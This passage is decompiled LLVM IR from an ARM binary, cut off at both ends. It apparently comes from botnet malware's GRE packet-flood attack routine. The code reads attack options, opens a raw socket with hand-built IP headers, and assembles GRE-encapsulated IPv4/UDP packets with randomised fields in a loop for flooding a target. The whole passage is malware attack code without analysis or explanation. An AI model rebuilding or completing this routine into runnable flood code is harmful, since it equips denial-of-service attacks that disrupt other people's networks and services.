  store i32 %v1_8a24, i32* %ip.global-to-local, align 4
  %v0_8a28 = load i32, i32* @r5, align 4
  store i32 %v0_8a28, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8a34 = load i32, i32* @r4, align 4
  store i32 %v0_8a34, i32* %r0.global-to-local, align 4
  %v6_8a3c = inttoptr i32 %v0_8a28 to i32*
  %v7_8a3c = call i32 @attack_get_opt_int(i32 %v0_8a34, i32* %v6_8a3c, i32 5, i32 1, i32 %v1_8a24)
  %v1_8a48 = urem i32 %v7_8a3c, 256
  store i32 %v1_8a48, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_8a54 = load i32, i32* @r5, align 4
  store i32 %v0_8a54, i32* %r1.global-to-local, align 4
  %v0_8a58 = load i32, i32* @r4, align 4
  store i32 %v0_8a58, i32* %r0.global-to-local, align 4
  %v5_8a60 = inttoptr i32 %v0_8a54 to i32*
  %v6_8a60 = call i32 @attack_get_opt_int(i32 %v0_8a58, i32* %v5_8a60, i32 6, i32 65535, i32 %v1_8a48)
  %v0_8a68 = load i32, i32* @r5, align 4
  store i32 %v0_8a68, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_8a60, i32* @r8, align 4
  %v0_8a78 = load i32, i32* @r4, align 4
  store i32 %v0_8a78, i32* %r0.global-to-local, align 4
  %v5_8a7c = inttoptr i32 %v0_8a68 to i32*
  %v6_8a7c = call i32 @attack_get_opt_int(i32 %v0_8a78, i32* %v5_8a7c, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_8a80 = load i32, i32* @r5, align 4
  store i32 %v0_8a80, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_8a7c, i32* @r7, align 4
  %v0_8a90 = load i32, i32* @r4, align 4
  store i32 %v0_8a90, i32* %r0.global-to-local, align 4
  %v5_8a94 = inttoptr i32 %v0_8a80 to i32*
  %v6_8a94 = call i32 @attack_get_opt_int(i32 %v0_8a90, i32* %v5_8a94, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8aa4 = load i32, i32* @r5, align 4
  store i32 %v0_8aa4, i32* %r1.global-to-local, align 4
  %v0_8aa8 = load i32, i32* @r4, align 4
  store i32 %v0_8aa8, i32* %r0.global-to-local, align 4
  %v5_8aac = inttoptr i32 %v0_8aa4 to i32*
  %v6_8aac = call i32 @attack_get_opt_int(i32 %v0_8aa8, i32* %v5_8aac, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_8ab4 = urem i32 %v6_8aac, 256
  store i32 %v1_8ab4, i32* %ip.global-to-local, align 4
  %v0_8ab8 = load i32, i32* @r5, align 4
  store i32 %v0_8ab8, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8ac4 = load i32, i32* @r4, align 4
  store i32 %v0_8ac4, i32* %r0.global-to-local, align 4
  %v5_8acc = inttoptr i32 %v0_8ab8 to i32*
  %v6_8acc = call i32 @attack_get_opt_int(i32 %v0_8ac4, i32* %v5_8acc, i32 19, i32 0, i32 %v1_8ab4)
  %v0_8ad4 = load i32, i32* @r5, align 4
  store i32 %v0_8ad4, i32* %r1.global-to-local, align 4
  %v2_8ad8 = load i32, i32* @global_var_2472c.58, align 4
  store i32 %v2_8ad8, i32* %r3.global-to-local, align 4
  store i32 %v6_8acc, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_8ae4 = load i32, i32* @r4, align 4
  store i32 %v0_8ae4, i32* %r0.global-to-local, align 4
  %v5_8ae8 = inttoptr i32 %v0_8ad4 to i32*
  %v6_8ae8 = call i32 @attack_get_opt_int(i32 %v0_8ae4, i32* %v5_8ae8, i32 25, i32 %v2_8ad8, i32 ptrtoint (i32* @0 to i32))
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_8afc = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_8afc, i32* %r0.global-to-local, align 4
  %v7_8b00 = icmp eq i32 %v3_8afc, -1
  store i1 %v7_8b00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8b00, label %dec_label_pc_9014, label %dec_label_pc_8b0c

dec_label_pc_8b0c:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_8b14 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_8b14, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_8b28 = call i32 @__GI_setsockopt(i32 %v3_8afc, i32 0, i32 3, i32 %v6_8b14, i32 4)
  store i32 %v5_8b28, i32* %r0.global-to-local, align 4
  %v7_8b2c = icmp eq i32 %v5_8b28, -1
  store i1 %v7_8b2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8b2c, label %dec_label_pc_900c, label %dec_label_pc_8b34

dec_label_pc_8b34:                                ; preds = %dec_label_pc_8b0c
  %v0_8b34 = load i32, i32* @r8, align 4
  %v0_8b38 = load i32, i32* @r7, align 4
  %v0_8b3c = load i32, i32* %fp.global-to-local, align 4
  %v0_8b40 = load i32, i32* @r6, align 4
  %v1_8b40 = urem i32 %v0_8b40, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_8b48 = urem i32 %v0_8b34, 65536
  store i32 %v3_8b48, i32* %r3.global-to-local, align 4
  %v3_8b4c = urem i32 %v0_8b38, 65536
  store i32 %v3_8b4c, i32* %r4.global-to-local, align 4
  %v0_8b50 = load i32, i32* @sl, align 4
  %v2_8b50 = icmp eq i32 %v0_8b50, 0
  store i1 %v2_8b50, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_8b68 = urem i32 %v0_8b3c, 65536
  store i32 %v3_8b68, i32* @fp, align 4
  br i1 %v2_8b50, label %dec_label_pc_9020, label %dec_label_pc_8b78

dec_label_pc_8b78:                                ; preds = %dec_label_pc_8b34
  %v3_8b38 = mul i32 %v0_8b38, 65536
  %v3_8b34 = mul i32 %v0_8b34, 65536
  %v0_8b3c.not = or i32 %v0_8b3c, -65536
  %v1_8b7c = xor i32 %v0_8b3c.not, 65535
  %v3_8b80 = mul i32 %v6_8a94, 65536
  %v1_8b84 = add i32 %v3_8b80, 4325376
  %tmp73 = udiv i32 %v1_8b84, 256
  %v3_8b98 = and i32 %tmp73, 65280
  %tmp74 = mul nsw i32 %v1_8b7c, 256
  %v3_8b9c = and i32 %tmp74, 65280
  store i32 %v3_8b9c, i32* %ip.global-to-local, align 4
  %v1_8ba0 = add i32 %v3_8b80, 524288
  %v1_8ba8 = add i32 %v3_8b80, 1835008
  %tmp75 = udiv i32 %v1_8b7c, 256
  %v4_8bac = urem i32 %tmp75, 256
  %v5_8bac = or i32 %v4_8bac, %v3_8b9c
  %v4_8bb4 = udiv i32 %v1_8b84, 16777216
  %v5_8bb4 = or i32 %v3_8b98, %v4_8bb4
  store i32 %v5_8bb4, i32* @r8, align 4
  %v3_8bc0 = udiv i32 %v1_8ba8, 256
  %tmp76 = mul i32 %v0_8b3c, 256
  %v3_8bc4 = and i32 %tmp76, 65280
  store i32 %v3_8b34, i32* %r2.global-to-local, align 4
  %tmp77 = udiv i32 %v0_8b3c, 256
  %v4_8bd4 = urem i32 %tmp77, 256
  %v5_8bd4 = or i32 %v4_8bd4, %v3_8bc4
  store i32 %v5_8bd4, i32* %r0.global-to-local, align 4
  %tmp78 = mul i32 %v0_8b34, 256
  %v3_8bd8 = and i32 %tmp78, 65280
  %v1_8bdc = and i32 %v3_8bc0, 65280
  store i32 %v1_8bdc, i32* @r6, align 4
  store i32 %v3_8b38, i32* %r1.global-to-local, align 4
  %tmp79 = mul i32 %v0_8b38, 256
  %v3_8be8 = and i32 %tmp79, 65280
  %tmp80 = udiv i32 %v0_8b34, 256
  %v4_8bec = urem i32 %tmp80, 256
  %v5_8bec = or i32 %v4_8bec, %v3_8bd8
  store i32 %v5_8bec, i32* @lr, align 4
  %v4_8bf0 = udiv i32 %v1_8ba8, 16777216
  %v5_8bf0 = or i32 %v1_8bdc, %v4_8bf0
  store i32 %v5_8bf0, i32* %r3.global-to-local, align 4
  %tmp81 = udiv i32 %v0_8b38, 256
  %v4_8bf4 = urem i32 %tmp81, 256
  %v5_8bf4 = or i32 %v4_8bf4, %v3_8be8
  %tmp82 = udiv i32 %v1_8ba0, 256
  %v3_8bf8 = and i32 %tmp82, 65280
  store i32 %v3_8bf8, i32* @r5, align 4
  %v5_8bfc = trunc i32 %v5_8bd4 to i16
  %v5_8c04 = trunc i32 %v5_8bf0 to i16
  %v4_8c0c = udiv i32 %v1_8ba0, 16777216
  %v5_8c0c = or i32 %v3_8bf8, %v4_8c0c
  store i32 %v5_8c0c, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v1_8c74 = trunc i32 %v6_8a1c to i8
  %sext = mul nuw i32 %v5_8bac, 65536
  %v4_8d00 = sdiv i32 %sext, 65536
  %v2_8d2c = icmp eq i32 %v1_8b40, 0
  %sext8 = mul nuw i32 %v5_8bec, 65536
  %v4_8d4c = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_8bf4, 65536
  %v4_8d54 = sdiv i32 %sext9, 65536
  %v1_8d0c27 = trunc i32 %v4_8d00 to i16
  br label %dec_label_pc_8c14

dec_label_pc_8c14:                                ; preds = %bb85, %dec_label_pc_8b78
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_8c20 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_8c20, i32* %r0.global-to-local, align 4
  %v2_8c28 = load i32, i32* @r4, align 4
  %v5_8c28 = mul i32 %v2_8c28, 4
  %v6_8c28 = add i32 %v5_8c28, %v2_89c8
  %v7_8c28 = inttoptr i32 %v6_8c28 to i32*
  store i32 %v2_8c20, i32* %v7_8c28, align 4
  %v3_8c2c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8c2c, i32* %r2.global-to-local, align 4
  %v5_8c34 = mul i32 %v3_8c2c, 24
  %v1_8c38 = load i32, i32* @sb, align 4
  %v2_8c38 = add i32 %v1_8c38, %v5_8c34
  store i32 %v2_8c38, i32* @lr, align 4
  store i32 %v2_89c8, i32* %r3.global-to-local, align 4
  %v4_8c40 = mul i32 %v3_8c2c, 4
  %v5_8c40 = add i32 %v4_8c40, %v2_89c8
  %v6_8c40 = inttoptr i32 %v5_8c40 to i32*
  %v7_8c40 = load i32, i32* %v6_8c40, align 4
  store i32 %v7_8c40, i32* %r4.global-to-local, align 4
  %v1_8c44 = inttoptr i32 %v7_8c40 to i8*
  %v2_8c44 = load i8, i8* %v1_8c44, align 1
  %tmp = urem i8 %v2_8c44, 16
  %v1_8c48 = zext i8 %tmp to i32
  %v1_8c4c = or i32 %v1_8c48, 64
  store i32 %v1_8c4c, i32* %r3.global-to-local, align 4
  %v1_8c50 = trunc i32 %v1_8c4c to i8
  store i8 %v1_8c50, i8* %v1_8c44, align 1
  %v0_8c54 = load i32, i32* %r4.global-to-local, align 4
  %v1_8c54 = inttoptr i32 %v0_8c54 to i8*
  %v2_8c54 = load i8, i8* %v1_8c54, align 1
  %v1_8c58 = and i8 %v2_8c54, -16
  %v1_8c5c = or i8 %v1_8c58, 5
  store i32 %v1_8a48, i32* %r5.global-to-local, align 4
  store i8 %v1_8c5c, i8* %v1_8c54, align 1
  store i32 %v6_89e0, i32* %r1.global-to-local, align 4
  %v2_8c6c = load i32, i32* %r4.global-to-local, align 4
  %v3_8c6c = add i32 %v2_8c6c, 1
  %v4_8c6c = inttoptr i32 %v3_8c6c to i8*
  store i8 %v5_8a00, i8* %v4_8c6c, align 1
  store i32 %v1_8a24, i32* %r2.global-to-local, align 4
  %v2_8c74 = load i32, i32* %r4.global-to-local, align 4
  %v3_8c74 = add i32 %v2_8c74, 8
  %v4_8c74 = inttoptr i32 %v3_8c74 to i8*
  store i8 %v1_8c74, i8* %v4_8c74, align 1
  %v2_8c7c = load i32, i32* %r4.global-to-local, align 4
  %v3_8c7c = add i32 %v2_8c7c, 4
  %v4_8c7c = inttoptr i32 %v3_8c7c to i16*
  store i16 %v5_8bfc, i16* %v4_8c7c, align 2
  %v2_8c84 = load i32, i32* %r4.global-to-local, align 4
  %v3_8c84 = add i32 %v2_8c84, 9
  %v4_8c84 = inttoptr i32 %v3_8c84 to i8*
  store i8 47, i8* %v4_8c84, align 1
  store i32 %v6_8ae8, i32* %r3.global-to-local, align 4
  %v0_8c8c = load i32, i32* %r5.global-to-local, align 4
  %v2_8c8c = icmp eq i32 %v0_8c8c, 0
  store i1 %v2_8c8c, i1* %cpsr_z.global-to-local, align 1
  %v1_8c90 = load i32, i32* %r4.global-to-local, align 4
  %v2_8c90 = add i32 %v1_8c90, 12
  %v3_8c90 = inttoptr i32 %v2_8c90 to i32*
  store i32 %v6_8ae8, i32* %v3_8c90, align 4
  br i1 %v2_8c8c, label %.thread25, label %bb

bb:                                               ; preds = %dec_label_pc_8c14
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_8c98 = load i32, i32* %r4.global-to-local, align 4
  %v4_8c98 = add i32 %v3_8c98, 6
  %v5_8c98 = inttoptr i32 %v4_8c98 to i16*
  store i16 64, i16* %v5_8c98, align 2
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_8c14, %bb
  %v0_8c9c = load i32, i32* @lr, align 4
  %v1_8c9c = add i32 %v0_8c9c, 16
  %v2_8c9c = inttoptr i32 %v1_8c9c to i32*
  %v3_8c9c = load i32, i32* %v2_8c9c, align 4
  store i32 22528, i32* %ip.global-to-local, align 4
  %v1_8ca4 = load i32, i32* %r4.global-to-local, align 4
  %v2_8ca4 = add i32 %v1_8ca4, 16
  %v3_8ca4 = inttoptr i32 %v2_8ca4 to i32*
  store i32 %v3_8c9c, i32* %v3_8ca4, align 4
  %v0_8ca8 = load i32, i32* %r4.global-to-local, align 4
  %v1_8ca8 = add i32 %v0_8ca8, 24
  store i32 %v1_8ca8, i32* %r1.global-to-local, align 4
  %v1_8cac = add i32 %v0_8ca8, 20
  store i32 %v1_8cac, i32* %r0.global-to-local, align 4
  %v0_8cb0 = load i32, i32* %ip.global-to-local, align 4
  %v1_8cb0 = add i32 %v0_8cb0, 101
  store i32 %v1_8cb0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_8cbc = load i32, i32* @r8, align 4
  %v1_8cbc = trunc i32 %v0_8cbc to i16
  %v3_8cbc = add i32 %v0_8ca8, 2
  %v4_8cbc = inttoptr i32 %v3_8cbc to i16*
  store i16 %v1_8cbc, i16* %v4_8cbc, align 2
  %v0_8cc0 = load i32, i32* %ip.global-to-local, align 4
  %v1_8cc0 = trunc i32 %v0_8cc0 to i16
  %v2_8cc0 = load i32, i32* %r0.global-to-local, align 4
  %v3_8cc0 = add i32 %v2_8cc0, 2
  %v4_8cc0 = inttoptr i32 %v3_8cc0 to i16*
  store i16 %v1_8cc0, i16* %v4_8cc0, align 2
  %v0_8cc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_8cc4 = trunc i32 %v0_8cc4 to i8
  %v2_8cc4 = load i32, i32* %r1.global-to-local, align 4
  %v3_8cc4 = add i32 %v2_8cc4, 13
  %v4_8cc4 = inttoptr i32 %v3_8cc4 to i8*
  store i8 %v1_8cc4, i8* %v4_8cc4, align 1
  %v0_8cc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_8cc8 = trunc i32 %v0_8cc8 to i8
  %v2_8cc8 = load i32, i32* %r1.global-to-local, align 4
  %v3_8cc8 = add i32 %v2_8cc8, 12
  %v4_8cc8 = inttoptr i32 %v3_8cc8 to i8*
  store i8 %v1_8cc8, i8* %v4_8cc8, align 1
  %v0_8ccc = load i32, i32* %r4.global-to-local, align 4
  %v1_8ccc = add i32 %v0_8ccc, 38
  %v2_8ccc = inttoptr i32 %v1_8ccc to i8*
  %v3_8ccc = load i8, i8* %v2_8ccc, align 1
  %tmp89 = urem i8 %v3_8ccc, 16
  %v1_8cd0 = zext i8 %tmp89 to i32
  %v1_8cd4 = or i32 %v1_8cd0, 64
  store i32 %v1_8cd4, i32* %r3.global-to-local, align 4
  %v1_8cd8 = trunc i32 %v1_8cd4 to i8
  store i8 %v1_8cd8, i8* %v2_8ccc, align 1
  %v0_8cdc = load i32, i32* %r4.global-to-local, align 4
  %v1_8cdc = add i32 %v0_8cdc, 38
  %v2_8cdc = inttoptr i32 %v1_8cdc to i8*
  %v3_8cdc = load i8, i8* %v2_8cdc, align 1
  %v1_8ce0 = and i8 %v3_8cdc, -16
  %v1_8ce4 = or i8 %v1_8ce0, 5
  store i8 %v1_8ce4, i8* %v2_8cdc, align 1
  %v0_8cf0 = load i32, i32* %r4.global-to-local, align 4
  %v1_8cf0 = add i32 %v0_8cf0, 38
  store i32 %v1_8cf0, i32* @r5, align 4
  %v3_8cf4 = add i32 %v0_8cf0, 39
  %v4_8cf4 = inttoptr i32 %v3_8cf4 to i8*
  store i8 %v5_8a00, i8* %v4_8cf4, align 1
  store i32 %v5_8bf0, i32* %r2.global-to-local, align 4
  %v2_8cfc = load i32, i32* @r5, align 4
  %v3_8cfc = add i32 %v2_8cfc, 2
  %v4_8cfc = inttoptr i32 %v3_8cfc to i16*
  store i16 %v5_8c04, i16* %v4_8cfc, align 2
  store i32 %v4_8d00, i32* %r3.global-to-local, align 4
  store i32 %v1_8a24, i32* %r1.global-to-local, align 4
  %v0_8d08 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8d08, label %.thread26, label %bb83

.thread26:                                        ; preds = %.thread25
  %v2_8d0c28 = load i32, i32* @r5, align 4
  %v3_8d0c29 = add i32 %v2_8d0c28, 4
  %v4_8d0c30 = inttoptr i32 %v3_8d0c29 to i16*
  store i16 %v1_8d0c27, i16* %v4_8d0c30, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  br label %bb84

bb83:                                             ; preds = %.thread25
  store i32 64, i32* %r2.global-to-local, align 4
  %v2_8d0c = load i32, i32* @r5, align 4
  %v3_8d0c = add i32 %v2_8d0c, 4
  %v4_8d0c = inttoptr i32 %v3_8d0c to i16*
  store i16 %v1_8d0c27, i16* %v4_8d0c, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  %v1_8d14 = load i32, i32* %r2.global-to-local, align 4
  %v2_8d14 = trunc i32 %v1_8d14 to i16
  %v3_8d14 = load i32, i32* @r5, align 4
  %v4_8d14 = add i32 %v3_8d14, 6
  %v5_8d14 = inttoptr i32 %v4_8d14 to i16*
  store i16 %v2_8d14, i16* %v5_8d14, align 2
  br label %bb84

bb84:                                             ; preds = %.thread26, %bb83
  %v0_8d18 = load i32, i32* %r1.global-to-local, align 4
  %v1_8d18 = trunc i32 %v0_8d18 to i8
  %v2_8d18 = load i32, i32* @r5, align 4
  %v3_8d18 = add i32 %v2_8d18, 8
  %v4_8d18 = inttoptr i32 %v3_8d18 to i8*
  store i8 %v1_8d18, i8* %v4_8d18, align 1
  %v0_8d1c = load i32, i32* %r3.global-to-local, align 4
  %v1_8d1c = trunc i32 %v0_8d1c to i8
  %v2_8d1c = load i32, i32* @r5, align 4
  %v3_8d1c = add i32 %v2_8d1c, 9
  %v4_8d1c = inttoptr i32 %v3_8d1c to i8*
  store i8 %v1_8d1c, i8* %v4_8d1c, align 1
  %v0_8d20 = call i32 @rand_next()
  store i32 %v0_8d20, i32* %r0.global-to-local, align 4
  store i32 %v1_8b40, i32* %r1.global-to-local, align 4
  store i1 %v2_8d2c, i1* %cpsr_z.global-to-local, align 1
  %v1_8d30 = sub i32 1023, %v0_8d20
  store i32 %v1_8d30, i32* %r3.global-to-local, align 4
  br i1 %v2_8d2c, label %.thread, label %.thread10

.thread:                                          ; preds = %bb84
  %v2_8d38 = load i32, i32* @r5, align 4
  %v3_8d38 = add i32 %v2_8d38, 16
  %v4_8d38 = inttoptr i32 %v3_8d38 to i32*
  store i32 %v1_8d30, i32* %v4_8d38, align 4
  br label %bb85

.thread10:                                        ; preds = %bb84
  %v1_8d34 = load i32, i32* %r4.global-to-local, align 4
  %v2_8d34 = add i32 %v1_8d34, 16
  %v3_8d34 = inttoptr i32 %v2_8d34 to i32*
  %v4_8d34 = load i32, i32* %v3_8d34, align 4
  store i32 %v4_8d34, i32* %r3.global-to-local, align 4
  %v2_8d3c = load i32, i32* @r5, align 4
  %v3_8d3c = add i32 %v2_8d3c, 16
  %v4_8d3c = inttoptr i32 %v3_8d3c to i32*
  store i32 %v4_8d34, i32* %v4_8d3c, align 4
  br label %bb85

bb85:                                             ; preds = %.thread, %.thread10
  %v1_8d40 = load i32, i32* @r5, align 4
  %v2_8d40 = add i32 %v1_8d40, 12
  %v3_8d40 = inttoptr i32 %v2_8d40 to i32*
  store i32 %v0_8d20, i32* %v3_8d40, align 4
  %v3_8d44 = load i32, i32* %stack_var_-44, align 4
  %v0_8d48 = load i32, i32* %r4.global-to-local, align 4
  %v1_8d48 = add i32 %v0_8d48, 58
  store i32 %v1_8d48, i32* @r6, align 4
  store i32 %v4_8d4c, i32* %r2.global-to-local, align 4
  %v1_8d50 = add i32 %v3_8d44, 1
  store i32 %v1_8d50, i32* @r4, align 4
  store i32 %v4_8d54, i32* %r3.global-to-local, align 4
  %v1_8d58 = load i32, i32* @sl, align 4
  %v9_8d58 = icmp eq i32 %v1_8d50, %v1_8d58
  store i1 %v9_8d58, i1* %cpsr_z.global-to-local, align 1
  %v0_8d5c = load i32, i32* @r7, align 4
  %v1_8d5c = trunc i32 %v0_8d5c to i16
  %v3_8d5c = add i32 %v0_8d48, 62
  %v4_8d5c = inttoptr i32 %v3_8d5c to i16*
  store i16 %v1_8d5c, i16* %v4_8d5c, align 2
  %v0_8d60 = load i32, i32* %r2.global-to-local, align 4
  %v1_8d60 = trunc i32 %v0_8d60 to i16
  %v2_8d60 = load i32, i32* @r6, align 4
  %v3_8d60 = inttoptr i32 %v2_8d60 to i16*
  store i16 %v1_8d60, i16* %v3_8d60, align 2
  %v0_8d64 = load i32, i32* %r3.global-to-local, align 4
  %v1_8d64 = trunc i32 %v0_8d64 to i16
  %v2_8d64 = load i32, i32* @r6, align 4
  %v3_8d64 = add i32 %v2_8d64, 2
  %v4_8d64 = inttoptr i32 %v3_8d64 to i16*
  store i16 %v1_8d64, i16* %v4_8d64, align 2
  %v0_8d68 = load i32, i32* @r4, align 4
  store i32 %v0_8d68, i32* %stack_var_-44, align 4
  %v5_8d6c = icmp slt i32 %v1_8d50, %v1_8d58
  br i1 %v5_8d6c, label %dec_label_pc_8c14, label %dec_label_pc_8d70

dec_label_pc_8d70:                                ; preds = %bb85
  %v1_8d78 = add i32 %v6_8a94, 8
  store i32 %v1_8d78, i32* %r4.global-to-local, align 4
  %v1_8d7c = add i32 %v6_8a94, 66
  store i32 %v1_8d7c, i32* %r5.global-to-local, align 4
  %v0_8d8c.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_8d88.preheader

dec_label_pc_8d88.preheader:                      ; preds = %dec_label_pc_8d70, %dec_label_pc_9020
  %v0_8d8c.pre = phi i32 [ %v0_8d8c.pre.pre, %dec_label_pc_8d70 ], [ 0, %dec_label_pc_9020 ]
  %stack_var_-132.0.ph = phi i32 [ %v1_8d7c, %dec_label_pc_8d70 ], [ %v1_902c, %dec_label_pc_9020 ]
  %stack_var_-136.0.ph = phi i32 [ %v1_8d78, %dec_label_pc_8d70 ], [ %v1_9028, %dec_label_pc_9020 ]
  %v2_8fdc = icmp eq i32 %v1_8b40, 0
  %v2_8e24 = ptrtoint i32* %stack_var_-48 to i32
  %v2_8e3c = ptrtoint i32* %stack_var_-52 to i32
  %v2_8e4c = ptrtoint i32* %stack_var_-56 to i32
  %v2_8e58 = ptrtoint i32* %stack_var_-54 to i32
  %v2_8e6c = icmp eq i32 %v1_8ab4, 0
  %v2_8dcc = icmp eq i32 %v6_8ae8, -1
  %v7_8dcc = icmp eq i32 %v6_8ae8, -1
  br label %dec_label_pc_8d88

dec_label_pc_8d88:                                ; preds = %dec_label_pc_8d88, %dec_label_pc_8e74, %dec_label_pc_8d88.preheader
  %v0_8d8c = phi i32 [ %v0_8d8c.pre, %dec_label_pc_8d88.preheader ], [ 0, %dec_label_pc_8d88 ], [ %v1_8f10, %dec_label_pc_8e74 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_8d8c = icmp eq i32 %v0_8d8c, 0
  store i1 %v2_8d8c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_8d8c, label %dec_label_pc_8d88, label %dec_label_pc_8d98

dec_label_pc_8d98:                                ; preds = %dec_label_pc_8d88
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8d9c

dec_label_pc_8d9c:                                ; preds = %dec_label_pc_8e74, %dec_label_pc_8d98
  %v1_8db0 = phi i32 [ %v1_8f0c, %dec_label_pc_8e74 ], [ 0, %dec_label_pc_8d98 ]
  %v5_8da0 = mul i32 %v1_8db0, 24
  %v1_8da4 = load i32, i32* @sb, align 4
  %v2_8da4 = add i32 %v1_8da4, %v5_8da0
  store i32 %v2_8da4, i32* %r3.global-to-local, align 4
  store i32 %v2_89c8, i32* %r4.global-to-local, align 4
  %v1_8dac = add i32 %v2_8da4, 20
  %v2_8dac = inttoptr i32 %v1_8dac to i8*
  %v3_8dac = load i8, i8* %v2_8dac, align 1
  %v4_8dac = zext i8 %v3_8dac to i32
  store i32 %v4_8dac, i32* %r2.global-to-local, align 4
  %v4_8db0 = mul i32 %v1_8db0, 4
  %v5_8db0 = add i32 %v4_8db0, %v2_89c8
  %v6_8db0 = inttoptr i32 %v5_8db0 to i32*
  %v7_8db0 = load i32, i32* %v6_8db0, align 4
  store i32 %v7_8db0, i32* @r5, align 4
  %v7_8db4 = icmp eq i8 %v3_8dac, 31
  store i1 %v7_8db4, i1* %cpsr_z.global-to-local, align 1
  %v1_8db8 = add i32 %v7_8db0, 24
  store i32 %v1_8db8, i32* @r7, align 4
  %v1_8dbc = add i32 %v7_8db0, 38
  store i32 %v1_8dbc, i32* @r6, align 4
  %v1_8dc0 = add i32 %v7_8db0, 58
  store i32 %v1_8dc0, i32* @r8, align 4
  %tmp90 = icmp ult i8 %v3_8dac, 32
  br i1 %tmp90, label %dec_label_pc_8f20, label %dec_label_pc_8dc8

dec_label_pc_8dc8:                                ; preds = %dec_label_pc_8d9c
  store i32 %v6_8ae8, i32* %r1.global-to-local, align 4
  store i1 %v7_8dcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8dcc, label %dec_label_pc_8f80, label %dec_label_pc_8dd4

dec_label_pc_8dd4:                                ; preds = %dec_label_pc_8f20, %dec_label_pc_8dc8
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_8ddc = load i32, i32* @fp, align 4
  %v9_8ddc = icmp eq i32 %v0_8ddc, 65535
  store i1 %v9_8ddc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8ddc, label %dec_label_pc_8f98, label %dec_label_pc_8de4

dec_label_pc_8de4:                                ; preds = %dec_label_pc_8f80.dec_label_pc_8de4_crit_edge, %dec_label_pc_8dd4
  %v1_8de8 = phi i32 [ %v1_8de8.pre, %dec_label_pc_8f80.dec_label_pc_8de4_crit_edge ], [ 65535, %dec_label_pc_8dd4 ]
  store i32 %v3_8b48, i32* %r2.global-to-local, align 4
  %v9_8de8 = icmp eq i32 %v3_8b48, %v1_8de8
  store i1 %v9_8de8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8de8, label %dec_label_pc_8fc0, label %dec_label_pc_8df0

dec_label_pc_8df0:                                ; preds = %dec_label_pc_8f98.dec_label_pc_8df0_crit_edge, %dec_label_pc_8de4
  %v1_8df4 = phi i32 [ %v1_8df4.pre, %dec_label_pc_8f98.dec_label_pc_8df0_crit_edge ], [ %v1_8de8, %dec_label_pc_8de4 ]
  store i32 %v3_8b4c, i32* %r3.global-to-local, align 4
  %v9_8df4 = icmp eq i32 %v3_8b4c, %v1_8df4
  store i1 %v9_8df4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8df4, label %dec_label_pc_8fd4, label %dec_label_pc_8dfc

dec_label_pc_8dfc:                                ; preds = %dec_label_pc_8fc0, %dec_label_pc_8df0
  store i32 %v1_8b40, i32* @r4, align 4
  store i1 %v2_8fdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8fdc, label %dec_label_pc_8ff0, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_8dfc
  %v1_8e04 = load i32, i32* @r5, align 4
  %v2_8e04 = add i32 %v1_8e04, 16
  %v3_8e04 = inttoptr i32 %v2_8e04 to i32*
  %v4_8e04 = load i32, i32* %v3_8e04, align 4
  store i32 %v4_8e04, i32* %r3.global-to-local, align 4
  %v2_8e08 = load i32, i32* @r6, align 4
  %v3_8e08 = add i32 %v2_8e08, 16
  %v4_8e08 = inttoptr i32 %v3_8e08 to i32*
  store i32 %v4_8e04, i32* %v4_8e08, align 4
  br label %dec_label_pc_8e10

